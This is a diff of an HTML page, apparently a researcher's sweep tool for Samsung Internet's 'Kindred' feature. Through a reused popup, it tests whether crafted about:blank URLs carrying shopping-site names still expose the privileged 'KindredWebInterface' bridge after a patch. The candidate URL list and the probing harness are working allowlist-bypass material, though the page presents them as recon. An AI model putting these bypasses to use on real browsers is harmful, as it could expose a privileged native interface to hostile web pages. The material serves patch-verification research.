@@ -3,22 +3,23 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kindred allowlist-bypass sweep</title>
+<title>Kindred allowlist-bypass sweep (popup)</title>
 <style>
  body{max-width:760px;margin:30px auto;padding:0 18px;font:15px/1.5 system-ui,sans-serif}
  button{padding:12px 18px;font:inherit;font-weight:650;width:100%;margin:6px 0}
  textarea{width:100%;height:11em;font:12px/1.4 monospace;padding:8px}
  pre{min-height:12em;padding:12px;white-space:pre-wrap;overflow-wrap:anywhere;background:#f3f4f6;font-size:12px}
  .warn{color:#b23;font-size:12px}
- iframe{display:none}
 </style>
 </head>
 <body>
-<h1>Samsung Kindred — allowlist-bypass sweep (incomplete-patch finder)</h1>
-<p class="warn">Benign recon only: detects whether each candidate URL still materializes <code>KindredWebInterface</code>
-(same same-origin about:blank detection as your PoC). No exploitation. Run AFTER a Samsung patch to find a surviving bypass.</p>
+<main id="main">
+<h1>Samsung Kindred — allowlist-bypass sweep (POPUP, matches your PoC)</h1>
+<p class="warn">Benign recon: reuses ONE popup (like your PoC) and detects whether each candidate materializes
+<code>KindredWebInterface</code>. First line is the KNOWN-GOOD control — if it shows "no bridge", the whole run is
+invalid (feature off / popups blocked), not a real negative.</p>
 
-<p>candidate bypass URLs (one per line) — all about:blank-family stay same-origin so the bridge is readable:</p>
+<p>candidates (one per line; line 1 = control):</p>
 <textarea id="cands">about:blank#kindred-probe://amazon.com/
 about:blank#amazon.com
 about:blank?amazon.com
@@ -34,27 +35,32 @@ about:blank#walmart.com
 about:blank#aliexpress.com
 about:blank#bestbuy.com
 about:blank#target.com</textarea>
-<button id="run" type="button">sweep (sequential, ~5s each)</button>
+<button id="run" type="button">sweep via popup (~6s each)</button>
 <pre id="log"></pre>
-<iframe id="f"></iframe>
+</main>
 
 <script>
 (() => {
 'use strict';
+const params=new URLSearchParams(location.search);
+if(params.has('bootstrap')){ document.querySelector('#main').innerHTML='<h1>bootstrap</h1>'; return; }
+
 const out=document.getElementById('log');
 function log(m){ const t=new Date().toISOString().slice(11,23); out.textContent+=`[${t}] ${m}\n`; }
 const vm=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
 log('SamsungBrowser='+(vm?vm[1]:'NOT DETECTED — open in Samsung Internet'));
 
-function testOne(url){
+function bootstrapUrl(){ const u=new URL(location.href); u.searchParams.set('bootstrap',String(Date.now())); u.hash='attacker-bootstrap'; return u.href; }
+
+// drive the SHARED popup through one candidate (same reload+poll as the PoC)
+function testOne(w, url){
   return new Promise(res=>{
-    const f=document.getElementById('f');
-    try{ f.src=url; }catch(e){ res('set-src err '+e); return; }
-    setTimeout(()=>{ try{ f.contentWindow.location.reload(); }catch(e){} }, 400);   // materialize bridge
+    try{ w.location.replace(url); }catch(e){ res('nav err '+e); return; }
+    setTimeout(()=>{ try{ w.location.reload(); }catch(e){} }, 600);   // force commit so Kindred re-evaluates
     const t0=performance.now();
     const iv=setInterval(()=>{
-      let w;
-      try{ w=f.contentWindow; var probe = typeof w.KindredWebInterface; }
+      let probe;
+      try{ probe = typeof w.KindredWebInterface; }
       catch(e){ clearInterval(iv); res('cross-origin / unreadable'); return; }
       if(probe!=='undefined'){ clearInterval(iv); res('BRIDGE PRESENT @+'+Math.round(performance.now()-t0)+'ms  <== STILL WORKS'); return; }
       if(performance.now()-t0>5000){ clearInterval(iv); res('no bridge (5s)'); }
@@ -64,9 +70,20 @@ function testOne(url){
 
 async function sweep(){
   const cands=document.getElementById('cands').value.split('\n').map(s=>s.trim()).filter(Boolean);
-  log('--- sweep '+cands.length+' candidates ---');
-  for(const u of cands){ log('test: '+u); const r=await testOne(u); log('   => '+r); }
-  log('--- sweep done. Any "STILL WORKS" line = a bypass that survives the current build/patch. ---');
+  const w=open(bootstrapUrl(),'_blank');
+  if(!w){ log('popup blocked — allow popups and retry'); return; }
+  log('--- sweep '+cands.length+' candidates via popup (line 1 = control) ---');
+  for(let i=0;i<cands.length;i++){
+    const u=cands[i];
+    log((i===0?'CONTROL ':'test: ')+u);
+    const r=await testOne(w,u);
+    log('   => '+r);
+    if(i===0 && r.indexOf('BRIDGE')===-1){ log('*** CONTROL FAILED — known-good string shows no bridge. Run is INVALID (feature off, wrong build, or popup issue). Fix that before trusting the rest. ***'); }
+    try{ w.location.replace('about:blank'); }catch(e){}            // clear bridge before next
+    await new Promise(r=>setTimeout(r,600));
+  }
+  try{ w.close(); }catch(e){}
+  log('--- sweep done. "STILL WORKS" on a NON-control line after a passing control = a surviving bypass. ---');
 }
 document.getElementById('run').addEventListener('click', sweep);
 })();
